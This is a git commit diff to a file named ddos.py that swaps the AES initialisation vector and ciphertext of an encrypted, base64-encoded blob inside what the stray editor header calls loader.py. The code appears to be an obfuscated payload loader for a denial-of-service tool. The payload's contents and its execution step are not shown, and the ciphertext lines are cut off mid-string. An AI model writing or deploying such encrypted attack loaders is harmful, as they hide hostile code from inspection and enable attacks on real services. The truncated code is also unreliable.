ff2235abd280d2eab529dfb3359d84989210d81f
Dagankol <104620350+Dagankol@users.noreply.github.com>
2026-07-06 18:06:40 +0800

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,9 +1,8 @@
-  GNU nano 9.0                   loader.py
 import base64, json
 from Crypto.Cipher import AES
 from Crypto.Util.Padding import unpad
 
-data = {"iv": "gPgmqHzVI7heEqQBT2vkpQ==", "ct": "FR7cgEj8Ig/ZKzoh9C23s8>
+data = {"iv": "UFCsfHHJFi427o09jXVdiA==", "ct": "euIUeN6EYzViQGGJ7AtUoo>
 
 iv = base64.b64decode(data['iv'])
 ct = base64.b64decode(data['ct'])
